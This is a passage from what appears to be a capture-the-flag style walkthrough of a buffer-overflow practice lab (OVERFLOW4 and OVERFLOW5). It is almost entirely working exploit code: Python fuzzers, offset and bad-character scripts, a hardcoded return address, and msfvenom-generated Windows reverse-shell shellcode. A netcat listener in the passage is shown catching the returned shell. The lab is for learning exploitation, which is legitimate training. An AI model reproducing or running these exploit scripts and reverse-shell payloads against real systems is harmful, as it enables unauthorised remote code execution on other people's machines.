print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v shellcode -f python -b '\x00\xa9\xcd\xd4'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xbe\x6b\xf9\xfc\x3f\xdb\xdd\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x83\xed\xfc\x31\x75\x0e"
shellcode += b"\x03\x1e\xf7\x1e\xca\x1c\xef\x5d\x35\xdc\xf0"
shellcode += b"\x01\xbf\x39\xc1\x01\xdb\x4a\x72\xb2\xaf\x1e"
shellcode += b"\x7f\x39\xfd\x8a\xf4\x4f\x2a\xbd\xbd\xfa\x0c"
shellcode += b"\xf0\x3e\x56\x6c\x93\xbc\xa5\xa1\x73\xfc\x65"
shellcode += b"\xb4\x72\x39\x9b\x35\x26\x92\xd7\xe8\xd6\x97"
shellcode += b"\xa2\x30\x5d\xeb\x23\x31\x82\xbc\x42\x10\x15"
shellcode += b"\xb6\x1c\xb2\x94\x1b\x15\xfb\x8e\x78\x10\xb5"
shellcode += b"\x25\x4a\xee\x44\xef\x82\x0f\xea\xce\x2a\xe2"
shellcode += b"\xf2\x17\x8c\x1d\x81\x61\xee\xa0\x92\xb6\x8c"
shellcode += b"\x7e\x16\x2c\x36\xf4\x80\x88\xc6\xd9\x57\x5b"
shellcode += b"\xc4\x96\x1c\x03\xc9\x29\xf0\x38\xf5\xa2\xf7"
shellcode += b"\xee\x7f\xf0\xd3\x2a\xdb\xa2\x7a\x6b\x81\x05"
shellcode += b"\x82\x6b\x6a\xf9\x26\xe0\x87\xee\x5a\xab\xcf"
shellcode += b"\xc3\x56\x53\x10\x4c\xe0\x20\x22\xd3\x5a\xae"
shellcode += b"\x0e\x9c\x44\x29\x70\xb7\x31\xa5\x8f\x38\x42"
shellcode += b"\xec\x4b\x6c\x12\x86\x7a\x0d\xf9\x56\x82\xd8"
shellcode += b"\xae\x06\x2c\xb3\x0e\xf6\x8c\x63\xe7\x1c\x03"
shellcode += b"\x5b\x17\x1f\xc9\xf4\xb2\xda\x9a\xf0\x42\xe4"
shellcode += b"\x5c\x6d\x41\xe4\x61\xd6\xcc\x02\x0b\x38\x99"
shellcode += b"\x9d\xa4\xa1\x80\x55\x54\x2d\x1f\x10\x56\xa5"
shellcode += b"\xac\xe5\x19\x4e\xd8\xf5\xce\xbe\x97\xa7\x59"
shellcode += b"\xc0\x0d\xcf\x06\x53\xca\x0f\x40\x48\x45\x58"
shellcode += b"\x05\xbe\x9c\x0c\xbb\x99\x36\x32\x46\x7f\x70"
shellcode += b"\xf6\x9d\xbc\x7f\xf7\x50\xf8\x5b\xe7\xac\x01"
shellcode += b"\xe0\x53\x61\x54\xbe\x0d\xc7\x0e\x70\xe7\x91"
shellcode += b"\xfd\xda\x6f\x67\xce\xdc\xe9\x68\x1b\xab\x15"
shellcode += b"\xd8\xf2\xea\x2a\xd5\x92\xfa\x53\x0b\x03\x04"
shellcode += b"\x8e\x8f\x23\xe7\x1a\xfa\xcb\xbe\xcf\x47\x96"
shellcode += b"\x40\x3a\x8b\xaf\xc2\xce\x74\x54\xda\xbb\x71"
shellcode += b"\x10\x5c\x50\x08\x09\x09\x56\xbf\x2a\x18" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa9\xcd\xd4

shellcode =  b""
shellcode += b"\xbe\x6b\xf9\xfc\x3f\xdb\xdd\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x83\xed\xfc\x31\x75\x0e"
shellcode += b"\x03\x1e\xf7\x1e\xca\x1c\xef\x5d\x35\xdc\xf0"
shellcode += b"\x01\xbf\x39\xc1\x01\xdb\x4a\x72\xb2\xaf\x1e"
shellcode += b"\x7f\x39\xfd\x8a\xf4\x4f\x2a\xbd\xbd\xfa\x0c"
shellcode += b"\xf0\x3e\x56\x6c\x93\xbc\xa5\xa1\x73\xfc\x65"
shellcode += b"\xb4\x72\x39\x9b\x35\x26\x92\xd7\xe8\xd6\x97"
shellcode += b"\xa2\x30\x5d\xeb\x23\x31\x82\xbc\x42\x10\x15"
shellcode += b"\xb6\x1c\xb2\x94\x1b\x15\xfb\x8e\x78\x10\xb5"
shellcode += b"\x25\x4a\xee\x44\xef\x82\x0f\xea\xce\x2a\xe2"
shellcode += b"\xf2\x17\x8c\x1d\x81\x61\xee\xa0\x92\xb6\x8c"
shellcode += b"\x7e\x16\x2c\x36\xf4\x80\x88\xc6\xd9\x57\x5b"
shellcode += b"\xc4\x96\x1c\x03\xc9\x29\xf0\x38\xf5\xa2\xf7"
shellcode += b"\xee\x7f\xf0\xd3\x2a\xdb\xa2\x7a\x6b\x81\x05"
shellcode += b"\x82\x6b\x6a\xf9\x26\xe0\x87\xee\x5a\xab\xcf"
shellcode += b"\xc3\x56\x53\x10\x4c\xe0\x20\x22\xd3\x5a\xae"
shellcode += b"\x0e\x9c\x44\x29\x70\xb7\x31\xa5\x8f\x38\x42"
shellcode += b"\xec\x4b\x6c\x12\x86\x7a\x0d\xf9\x56\x82\xd8"
shellcode += b"\xae\x06\x2c\xb3\x0e\xf6\x8c\x63\xe7\x1c\x03"
shellcode += b"\x5b\x17\x1f\xc9\xf4\xb2\xda\x9a\xf0\x42\xe4"
shellcode += b"\x5c\x6d\x41\xe4\x61\xd6\xcc\x02\x0b\x38\x99"
shellcode += b"\x9d\xa4\xa1\x80\x55\x54\x2d\x1f\x10\x56\xa5"
shellcode += b"\xac\xe5\x19\x4e\xd8\xf5\xce\xbe\x97\xa7\x59"
shellcode += b"\xc0\x0d\xcf\x06\x53\xca\x0f\x40\x48\x45\x58"
shellcode += b"\x05\xbe\x9c\x0c\xbb\x99\x36\x32\x46\x7f\x70"
shellcode += b"\xf6\x9d\xbc\x7f\xf7\x50\xf8\x5b\xe7\xac\x01"
shellcode += b"\xe0\x53\x61\x54\xbe\x0d\xc7\x0e\x70\xe7\x91"
shellcode += b"\xfd\xda\x6f\x67\xce\xdc\xe9\x68\x1b\xab\x15"
shellcode += b"\xd8\xf2\xea\x2a\xd5\x92\xfa\x53\x0b\x03\x04"
shellcode += b"\x8e\x8f\x23\xe7\x1a\xfa\xcb\xbe\xcf\x47\x96"
shellcode += b"\x40\x3a\x8b\xaf\xc2\xce\x74\x54\xda\xbb\x71"
shellcode += b"\x10\x5c\x50\x08\x09\x09\x56\xbf\x2a\x18"

inputBuffer = b'A' * 2026
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += shellcode
inputBuffer += b'C' * (2500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56198
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW5<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW5 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW5 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW5/thm-overflow5_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 800

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Generate msf-pattern_create to create a string to determine offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ msf-pattern_create -l 800 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 800
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
└─$ msf-pattern_offset -l 800 -q 356b4134 
[*] Exact match at offset 314
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 314
inputBuffer += b'B' * 4
inputBuffer += b'C' * (800 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x16

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 314
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (800 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x16\x2f\xf4\xfd

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"
)

inputBuffer = b'A' * 314
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (800 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of5/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x16\x2f\xf4\xfd

payload = b'D' * 400

inputBuffer = b'A' * 314
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (800 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x16\x2f\xf4\xfd'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1922 bytes
payload =  b""
payload += b"\xfc\xbb\xcc\xa2\x48\xeb\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\x30\x4a\xca\xeb\xc8\x8b\xab\x62"
payload += b"\x2d\xba\xeb\x11\x26\xed\xdb\x52\x6a\x02\x97"
payload += b"\x37\x9e\x91\xd5\x9f\x91\x12\x53\xc6\x9c\xa3"
payload += b"\xc8\x3a\xbf\x27\x13\x6f\x1f\x19\xdc\x62\x5e"
payload += b"\x5e\x01\x8e\x32\x37\x4d\x3d\xa2\x3c\x1b\xfe"
payload += b"\x49\x0e\x8d\x86\xae\xc7\xac\xa7\x61\x53\xf7"
payload += b"\x67\x80\xb0\x83\x21\x9a\xd5\xae\xf8\x11\x2d"
payload += b"\x44\xfb\xf3\x7f\xa5\x50\x3a\xb0\x54\xa8\x7b"
payload += b"\x77\x87\xdf\x75\x8b\x3a\xd8\x42\xf1\xe0\x6d"
payload += b"\x50\x51\x62\xd5\xbc\x63\xa7\x80\x37\x6f\x0c"
payload += b"\xc6\x1f\x6c\x93\x0b\x14\x88\x18\xaa\xfa\x18"
payload += b"\x5a\x89\xde\x41\x38\xb0\x47\x2c\xef\xcd\x97"
payload += b"\x8f\x50\x68\xdc\x22\x84\x01\xbf\x2a\x69\x28"
payload += b"\x3f\xab\xe5\x3b\x4c\x99\xaa\x97\xda\x91\x23"
payload += b"\x3e\x1d\xd5\x19\x86\xb1\x28\xa2\xf7\x98\xee"
payload += b"\xf6\xa7\xb2\xc7\x76\x2c\x42\xe7\xa2\xe3\x12"
payload += b"\x47\x1d\x44\xc2\x27\xcd\x2c\x08\xa8\x32\x4c"
payload += b"\x33\x62\x5b\xe7\xce\xe5\x6e\xf8\xd0\xf3\x06"
payload += b"\xfa\xd0\xfa\x6d\x73\x36\x96\x81\xd2\xe1\x0f"
payload += b"\x3b\x7f\x79\xb1\xc4\x55\x04\xf1\x4f\x5a\xf9"
payload += b"\xbc\xa7\x17\xe9\x29\x48\x62\x53\xff\x57\x58"
payload += b"\xfb\x63\xc5\x07\xfb\xea\xf6\x9f\xac\xbb\xc9"
payload += b"\xe9\x38\x56\x73\x40\x5e\xab\xe5\xab\xda\x70"
payload += b"\xd6\x32\xe3\xf5\x62\x11\xf3\xc3\x6b\x1d\xa7"
payload += b"\x9b\x3d\xcb\x11\x5a\x94\xbd\xcb\x34\x4b\x14"
payload += b"\x9b\xc1\xa7\xa7\xdd\xcd\xed\x51\x01\x7f\x58"
payload += b"\x24\x3e\xb0\x0c\xa0\x47\xac\xac\x4f\x92\x74"
payload += b"\xcc\xad\x36\x81\x65\x68\xd3\x28\xe8\x8b\x0e"
payload += b"\x6e\x15\x08\xba\x0f\xe2\x10\xcf\x0a\xae\x96"
payload += b"\x3c\x67\xbf\x72\x42\xd4\xc0\x56\x42\xda\x3e"
payload += b"\x59" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x16\x2f\xf4\xfd

payload =  b""
payload += b"\xfc\xbb\xcc\xa2\x48\xeb\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\x30\x4a\xca\xeb\xc8\x8b\xab\x62"
payload += b"\x2d\xba\xeb\x11\x26\xed\xdb\x52\x6a\x02\x97"
payload += b"\x37\x9e\x91\xd5\x9f\x91\x12\x53\xc6\x9c\xa3"
payload += b"\xc8\x3a\xbf\x27\x13\x6f\x1f\x19\xdc\x62\x5e"
payload += b"\x5e\x01\x8e\x32\x37\x4d\x3d\xa2\x3c\x1b\xfe"
payload += b"\x49\x0e\x8d\x86\xae\xc7\xac\xa7\x61\x53\xf7"
payload += b"\x67\x80\xb0\x83\x21\x9a\xd5\xae\xf8\x11\x2d"
payload += b"\x44\xfb\xf3\x7f\xa5\x50\x3a\xb0\x54\xa8\x7b"
payload += b"\x77\x87\xdf\x75\x8b\x3a\xd8\x42\xf1\xe0\x6d"
payload += b"\x50\x51\x62\xd5\xbc\x63\xa7\x80\x37\x6f\x0c"
payload += b"\xc6\x1f\x6c\x93\x0b\x14\x88\x18\xaa\xfa\x18"
payload += b"\x5a\x89\xde\x41\x38\xb0\x47\x2c\xef\xcd\x97"
payload += b"\x8f\x50\x68\xdc\x22\x84\x01\xbf\x2a\x69\x28"
payload += b"\x3f\xab\xe5\x3b\x4c\x99\xaa\x97\xda\x91\x23"
payload += b"\x3e\x1d\xd5\x19\x86\xb1\x28\xa2\xf7\x98\xee"
payload += b"\xf6\xa7\xb2\xc7\x76\x2c\x42\xe7\xa2\xe3\x12"
payload += b"\x47\x1d\x44\xc2\x27\xcd\x2c\x08\xa8\x32\x4c"
payload += b"\x33\x62\x5b\xe7\xce\xe5\x6e\xf8\xd0\xf3\x06"
payload += b"\xfa\xd0\xfa\x6d\x73\x36\x96\x81\xd2\xe1\x0f"
payload += b"\x3b\x7f\x79\xb1\xc4\x55\x04\xf1\x4f\x5a\xf9"
payload += b"\xbc\xa7\x17\xe9\x29\x48\x62\x53\xff\x57\x58"
payload += b"\xfb\x63\xc5\x07\xfb\xea\xf6\x9f\xac\xbb\xc9"
payload += b"\xe9\x38\x56\x73\x40\x5e\xab\xe5\xab\xda\x70"
payload += b"\xd6\x32\xe3\xf5\x62\x11\xf3\xc3\x6b\x1d\xa7"
payload += b"\x9b\x3d\xcb\x11\x5a\x94\xbd\xcb\x34\x4b\x14"
payload += b"\x9b\xc1\xa7\xa7\xdd\xcd\xed\x51\x01\x7f\x58"
payload += b"\x24\x3e\xb0\x0c\xa0\x47\xac\xac\x4f\x92\x74"
payload += b"\xcc\xad\x36\x81\x65\x68\xd3\x28\xe8\x8b\x0e"
payload += b"\x6e\x15\x08\xba\x0f\xe2\x10\xcf\x0a\xae\x96"
payload += b"\x3c\x67\xbf\x72\x42\xd4\xc0\x56\x42\xda\x3e"
payload += b"\x59"

inputBuffer = b'A' * 314
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (800 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
